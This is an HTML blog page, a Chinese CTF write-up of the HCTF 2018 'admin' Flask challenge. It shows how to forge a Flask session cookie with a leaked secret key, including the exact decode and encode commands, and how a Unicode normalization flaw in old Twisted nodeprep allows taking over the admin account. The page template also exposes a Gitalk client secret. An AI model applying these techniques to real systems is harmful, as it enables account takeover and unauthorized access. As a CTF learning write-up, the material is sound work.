@@ -1,0 +1,579 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>[HCTF 2018] admin | 喵喵喵喵 | 某鱼唇的人类</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#66CCFF">
+    
+    
+    <meta name="keywords" content="CTF">
+    <meta name="description" content="基本信息进去就是login，register，源码里有一句注释 1&lt;!-- you are not admin --&gt;  随意注册账号登录进去，有一个change password选项，change页面注释github泄漏： https:&#x2F;&#x2F;github.com&#x2F;woadsl1234&#x2F;hctf_flask&#x2F; session 伪造因为题目要求admin，源码也可以看到需要session[">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[HCTF 2018] admin">
+<meta property="og:url" content="https://darkwing.moe/2019/11/04/HCTF-2018-admin/index.html">
+<meta property="og:site_name" content="喵喵喵喵">
+<meta property="og:description" content="基本信息进去就是login，register，源码里有一句注释 1&lt;!-- you are not admin --&gt;  随意注册账号登录进去，有一个change password选项，change页面注释github泄漏： https:&#x2F;&#x2F;github.com&#x2F;woadsl1234&#x2F;hctf_flask&#x2F; session 伪造因为题目要求admin，源码也可以看到需要session[">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019110405.jpg">
+<meta property="article:published_time" content="2019-11-04T07:15:11.000Z">
+<meta property="article:modified_time" content="2019-11-04T07:15:53.775Z">
+<meta property="article:author" content="暗羽">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019110405.jpg">
+    
+        <link rel="alternate" type="application/atom+xml" title="喵喵喵喵" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">暗羽</h5>
+          <a href="mailto:1126955201@qq.com" title="1126955201@qq.com" class="mail">1126955201@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/zjicmDarkWing" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://www.weibo.com/zjicmDarkWing" target="_blank" >
+                <i class="icon icon-lg icon-weibo"></i>
+                Weibo
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://twitter.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-gratipay"></i>
+                网恋选我我超甜
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/links"  >
+                <i class="icon icon-lg icon-link"></i>
+                一些链接
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">[HCTF 2018] admin</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="検索">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">[HCTF 2018] admin</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2019-11-04T07:15:11.000Z" itemprop="datePublished" class="page-time">
+  2019-11-04
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#基本信息"><span class="post-toc-number">1.</span> <span class="post-toc-text">基本信息</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#session-伪造"><span class="post-toc-number">2.</span> <span class="post-toc-text">session 伪造</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Unicode欺骗"><span class="post-toc-number">3.</span> <span class="post-toc-text">Unicode欺骗</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-HCTF-2018-admin"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">[HCTF 2018] admin</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-11-04 15:15:11" datetime="2019-11-04T07:15:11.000Z"  itemprop="datePublished">2019-11-04</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><p>进去就是login，register，源码里有一句注释</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- you are not admin --&gt;</span><br></pre></td></tr></table></figure>
+
+<p>随意注册账号登录进去，有一个change password选项，change页面注释github泄漏：</p>
+<p><a href="https://github.com/woadsl1234/hctf_flask/" target="_blank" rel="noopener">https://github.com/woadsl1234/hctf_flask/</a></p>
+<h1 id="session-伪造"><a href="#session-伪造" class="headerlink" title="session 伪造"></a>session 伪造</h1><p>因为题目要求admin，源码也可以看到需要<code>session[&#39;name&#39;] == &#39;admin&#39;</code>后会在页面显示flag，根据p师傅之前的文章：</p>
+<p><a href="https://www.leavesongs.com/PENETRATION/client-session-security.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/client-session-security.html</a></p>
+<p>flask的session都是在本地的，通过一个SECRET_KEY进行签名,可以直接使用脚本进行操作：</p>
+<p><a href="https://github.com/noraj/flask-session-cookie-manager" target="_blank" rel="noopener">https://github.com/noraj/flask-session-cookie-manager</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> python3 flask_session_manager.py decode -c .eJw9kE2LwjAURf_KkLWLfm4EFx1SSwvvlZZ0QrIRR6s16XOgrUyN-N-nOOD6cs_l3AfbnYZ27Nh6Gm7tiu0uR7Z-sI9vtmYQqBllc1fuEIKrqRRHg6boFKUxEIQgVKg5WhRFB1l-1yYJQeYOeR6poLbKJV7JP0m53NNi2wOlDmTqA1UORBVCVsWaa4u8viBPfCW_CAPsNaU-Ghsp0fXgDg7dOUZSQSlhRpPMWhytzhofTGGR8jtksGHPFTuMw2k3_dj2-lYoeROBaH6XWoym7kAiaYJZma1VAnsI9KKTx1qcI5DFMlJ3WG1euAvtz-2bJAIUZfKfXPe0BGxqx4mt2G1sh9dtzPfY8w9gTmvt.Xb_HBg.KuktGfJY6uvuJvIBeqzZF6Bk5CU</span></span><br><span class="line">b'&#123;"_fresh":true,"_id":&#123;" b":"M2YxNWUyYzc3MzRmOTdjNjJhYmE5MmM3MTY3ZDNkNTJhMGIyZjA3MWIzNDI4Y2RkYzA0ODBmYzI0ZTFlMmEzMWE1MmQzMTQ3MGQ5ZDZkNDRiNDA1YWVmN2NlZmE1Njk4YThlMzczNzg5NmY2OWMxNjAxZTdkZGU1MjJkNmIyMGM="&#125;,"csrf_token":&#123;" b":"ODU4MTUwNjA5NjRhMWNmZmMxYjFkYTNlM2ZhYmI5ZTg4MWJmY2RhNQ=="&#125;,"image":&#123;" b":"T2NTOA=="&#125;,"name":"test","user_id":"10"&#125;'</span><br></pre></td></tr></table></figure>
+
+<p>可以看到原有的session中name为test，可以尝试将其修改为admin后重新签名，github源码中也有</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SECRET_KEY = os.environ.get(<span class="string">'SECRET_KEY'</span>) <span class="keyword">or</span> <span class="string">'ckj123'</span></span><br></pre></td></tr></table></figure>
+
+<p>那么就直接尝试使用ckj123作为KEY</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> python3 flask_session_manager.py encode -t <span class="string">"&#123;'_fresh': True, '_id': b'ca73d01f58fe172c279fdb1026ba1202390ee0e60b049380c8785511afd9560104b61fa487c4bcb293fc463ef1548d3cad028ce1b5ff4922ab5246e4105a0a33', 'csrf_token': b'bcb966803bad1e8b020d5b7cf5e843fb157ef072', 'image': b'Av32', 'name': 'admin', 'user_id': '10'&#125;"</span> -s ckj123                                                                       </span></span><br><span class="line">.eJxFkE9rwkAUxL9KeWcP-aMXwUNko6TwdllYm769iDUxyUvWQlRiVvzuDULbw8DAwG-YecD-1JeXGpbX_lbOYN8UsHzA2xcsgaI0xkgPmFOotrZDcxzJZ7HKbUucDsi2IZOOKDKvzLqzkySvGxR6gb4ayFexErsQzaa2Ti-koQFNEhDT3bo0UKJguX1n4myBkWUpyNuc7tLouRWSKZ-6uWZrNo3MrZOiHdFN3mSBdLtgYoVk1jV6XMFzBsdLf9pfv9vy_D_ByUYZipRIPLlNi_luTpyMuNUhccGWPzoltLcum2qLznISY7V64Rp3qMo_kv4k_5ucD24K4FC45gwzuF3K_vUbhAE8fwBi-m2U.Xb_MEw._H8R8AAmbOCT1jQg8JQnP7W7Qmo</span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019110405.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="Unicode欺骗"><a href="#Unicode欺骗" class="headerlink" title="Unicode欺骗"></a>Unicode欺骗</h1><p>这个应该是预期解</p>
+<p>源码中显示，各种操作前都会对用户名进行自定义的strlower</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strlower</span><span class="params">(username)</span>:</span></span><br><span class="line">    username = nodeprep.prepare(username)</span><br><span class="line">    <span class="keyword">return</span> username</span><br></pre></td></tr></table></figure>
+
+<p>nodeprep.prepare对应的库是</p>
+<p><a href="https://github.com/twisted/twisted" target="_blank" rel="noopener">https://github.com/twisted/twisted</a></p>
+<p>requirements.txt中显示Twisted==10.2.0</p>
+<p>版本非常老，明显有问题</p>
+<p>根据这篇文章</p>
+<p><a href="https://tw.saowen.com/a/72b7816b29ef30533882a07a4e1040f696b01e7888d60255ab89d37cf2f18f3e" target="_blank" rel="noopener">https://tw.saowen.com/a/72b7816b29ef30533882a07a4e1040f696b01e7888d60255ab89d37cf2f18f3e</a></p>
+<p>unicode问题，对于一些特殊字符，nodeprep.prepare会进行如下操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ᴬ -&gt; A -&gt; a</span><br></pre></td></tr></table></figure>
+
+<p>即第一次将其转换为大写，第二次将其转换为小写</p>
+<p>那么，攻击链大概就这样</p>
+<ul>
+<li>注册用户ᴬdmin</li>
+<li>登录用户ᴬdmin，变成Admin</li>
+<li>修改密码Admin，更改了admin的密码</li>
+</ul>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    最終更新：<time datetime="2019-11-04T07:15:53.775Z" itemprop="dateUpdated">2019-11-04 15:15:53</time>
+</span><br>
+
+
+        
+        水平不济整日被虐这也不会那也得学,脑子太蠢天天垫底这看不懂那学不会
+        
+    </div>
+    
+    <footer>
+        <a href="https://darkwing.moe">
+            <img src="/img/avatar.jpg" alt="暗羽">
+            暗羽
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2019/11/04/HCTF-2018-admin/&title=《[HCTF 2018] admin》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2019/11/04/HCTF-2018-admin/&title=《[HCTF 2018] admin》 — 喵喵喵喵&source=安全研究，懒，基本不自己写" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2019/11/04/HCTF-2018-admin/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《[HCTF 2018] admin》 — 喵喵喵喵&url=https://darkwing.moe/2019/11/04/HCTF-2018-admin/&via=https://darkwing.moe" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2019/11/04/HCTF-2018-admin/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2019/11/06/CTF%E4%B8%ADRSA%E7%B1%BB%E9%A2%98%E7%9B%AE/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">CTF中RSA类题目</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2019/10/30/%E6%8A%A4%E7%BD%91%E6%9D%AF2018-easy-tornado/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">护网杯2018-easy_tornado</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: 'd35074a248599729ad26',
+          clientSecret: 'd208d5902ab831ba7294f942046bcd8da954f9ff',
+          repo: 'BlogComments',
+          owner: 'zjicmDarkWing',
+          admin: ['zjicmDarkWing'],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        谢谢大爷~
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/wechat.png" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/wechat.png" data-alipay="/img/alipay.jpeg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>このブログの内容物は<a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.ja" target="_blank">クリエイティブ・コモンズ 表示 - 非営利 - 継承 4.0 国際ライセンスの下に提供されています</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>暗羽 &copy; 2014 - 2020</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2019/11/04/HCTF-2018-admin/&title=《[HCTF 2018] admin》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2019/11/04/HCTF-2018-admin/&title=《[HCTF 2018] admin》 — 喵喵喵喵&source=安全研究，懒，基本不自己写" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2019/11/04/HCTF-2018-admin/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《[HCTF 2018] admin》 — 喵喵喵喵&url=https://darkwing.moe/2019/11/04/HCTF-2018-admin/&via=https://darkwing.moe" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2019/11/04/HCTF-2018-admin/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACLklEQVR42u3awW7rMAwEwP7/T6fAu7Y2dimneJFGp6CNY40OBEXy6yter3/r5+f7v1w99fqxrp56eGFgYHws43W7rjb6LOD+yO73hoGBcQ5j5ecSfB5eZ8eHgYGBkaRrOSD5PgYGBsZKwJ0F03sMBgYGRsJIkrxZEpkU6ZL3PnYXx8DA+EDGSmPg3Z//qL+BgYHxHzNmRbSnUsP78F3sCgMDY2tGPjyxkt61xbgZHgMDY1fGrEmZp4/51TRvIfzyTQwMjK0ZbTBdSftmSWfUEsDAwDiGkaeJz452vaUwh4GBsRGjLYGtpIDJRTe/DP9SaMPAwNiUsZKKza677cU1D8oYGBi7MtrXJ4Evv77OGgOXVUMMDIwDGHXn86Exr7blgIGBcSZjJSlMtpJsdDbMgYGBcQ4jSd3aILvUgGwbqxgYGFszVmYV2tU2LNtmKgYGxt6MvOA1G0XN/9sOdmBgYJzAmA1b5Bfa9vfzpPOBmREMDIwPYQwfiIPmrGE5TFUxMDA2ZeRpWXI1TY4jbxIUJTYMDIwDGG2BbPZUEqyHYxwYGBhbM1aK/m3zMgfkb8TAwDiB8SrXbNPtuSaBGAMD4xzGSnhtG5OzUlrRicXAwNiaMQuyszGvlRLe/dsxMDBOYNR333K0IjmIWaKJgYGB0Qbc9VZlchxFIxMDA+NIRj4KloTp9sgufxkDA+MARru5OnWLr6n19RUDA+MAxvtGK/K0LxlBawfUMDAwtmB8A4WCslDoL8i2AAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '死鬼去哪里了！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '(つェ⊂)咦!又好了!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+</body>
+</html>
